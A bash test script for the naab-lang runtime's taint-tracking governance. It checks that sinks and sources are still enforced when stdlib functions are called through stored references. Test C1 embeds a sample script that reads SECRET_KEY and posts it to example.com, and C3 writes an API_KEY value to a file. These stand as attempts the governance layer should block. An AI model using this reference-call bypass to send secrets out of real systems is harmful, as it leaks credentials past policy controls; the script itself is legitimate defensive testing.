#!/usr/bin/env bash
# test_governance_funcref_c.sh — Finding C: governance bypass via stdlib function references
# Verifies that taint sinks, dangerous-calls, and taint-source propagation work when
# stdlib functions are invoked via stored references (let f = env.get; f(key)).

set -euo pipefail
NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0
ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

GOVDIR="${HOME}/.naab/test_govC_$$"
mkdir -p "$GOVDIR"

cleanup() { rm -rf "$GOVDIR"; }
trap cleanup EXIT

# govern.json — taint tracking active, http.post is a sink, env.get is a source
cat > "$GOVDIR/govern.json" << 'GOVEOF'
{
  "version": "1.0",
  "taint_tracking": {
    "enabled": true,
    "level": "hard",
    "sources": ["env.get"],
    "sinks": ["http.post", "file.write"],
    "sanitizers": []
  },
  "capabilities": {
    "network": false,
    "filesystem": "read"
  }
}
GOVEOF

run_script() {
    local script="$1"; shift
    local tmpf="${GOVDIR}/test_$$.naab"
    printf '%s' "$script" > "$tmpf"
    local out ec=0
    out=$("$NAAB" "$tmpf" "$@" 2>&1) || ec=$?
    printf '%s\n__EXIT__%d' "$out" "$ec"
    rm -f "$tmpf"
}
extract_exit() { echo "$1" | grep -o '__EXIT__[0-9]*' | grep -o '[0-9]*'; }
extract_out()  { echo "$1" | sed 's/__EXIT__[0-9]*//'; }

echo "=== test_governance_funcref_c.sh ==="
echo ""

# ---------------------------------------------------------------------------
# C1: http.post called via function reference with tainted arg should be blocked
# ---------------------------------------------------------------------------
echo "[C1] Taint sink blocked when http.post called via function reference"
script='use http
use env
main {
  let post_fn = http.post
  let key = env.get("SECRET_KEY")
  post_fn("http://example.com", key)
}'
result=$(run_script "$script" 2>&1 || true)
out=$(extract_out "$result")
ec=$(extract_exit "$result")

if echo "$out" | grep -qi "taint\|governance\|blocked\|untrusted"; then
    ok "taint violation reported"
elif [[ "$ec" -ne 0 ]]; then
    ok "execution blocked (exit $ec, output: ${out:0:80})"
else
    fail "expected block, got exit $ec: ${out:0:120}"
fi

echo ""

# ---------------------------------------------------------------------------
# C2: Safe call via function reference (non-tainted arg) should NOT be blocked
# (network is disabled, so this will fail for a different reason — that's OK,
#  we just need it NOT to fail with a taint violation)
# ---------------------------------------------------------------------------
echo "[C2] Non-tainted arg via function reference does not produce taint error"
script='use http
main {
  let post_fn = http.post
  post_fn("http://example.com", "static_payload")
}'
result=$(run_script "$script" 2>&1 || true)
out=$(extract_out "$result")

if echo "$out" | grep -qi "taint.*untrusted\|taint tracking violation"; then
    fail "false-positive taint violation on non-tainted arg"
else
    ok "no false-positive taint violation"
fi

echo ""

# ---------------------------------------------------------------------------
# C3: env.get called via reference should propagate taint to result variable
# (verified by then using that result at a taint sink)
# ---------------------------------------------------------------------------
echo "[C3] Taint propagates from env.get reference call through variable to sink"
script='use env
use file
main {
  let get_fn = env.get
  let secret = get_fn("API_KEY")
  let write_fn = file.write
  write_fn("/tmp/out.txt", secret)
}'
result=$(run_script "$script" 2>&1 || true)
out=$(extract_out "$result")
ec=$(extract_exit "$result")

if echo "$out" | grep -qi "taint\|governance\|blocked\|untrusted"; then
    ok "taint propagated through reference call to sink"
elif [[ "$ec" -ne 0 ]]; then
    ok "blocked (exit $ec)"
else
    fail "expected taint block at file.write sink, got exit 0: ${out:0:120}"
fi

echo ""

# ---------------------------------------------------------------------------
# C4: env.delete_var called via reference with tainted key should be governed
# ---------------------------------------------------------------------------
echo "[C4] env.delete_var via reference with tainted key is governed"
script='use env
main {
  let del_fn = env.delete_var
  let key = env.get("SOME_KEY")
  del_fn(key)
}'
result=$(run_script "$script" 2>&1 || true)
out=$(extract_out "$result")
ec=$(extract_exit "$result")

if echo "$out" | grep -qi "taint\|governance\|blocked\|untrusted"; then
    ok "env.delete_var taint check fired"
elif [[ "$ec" -ne 0 ]]; then
    ok "blocked (exit $ec)"
else
    fail "expected governance block on env.delete_var with tainted key: ${out:0:120}"
fi

echo ""

# Summary
TOTAL=$((PASS + FAIL))
echo "Results: ${PASS}/${TOTAL} passed"
[[ "$FAIL" -eq 0 ]]
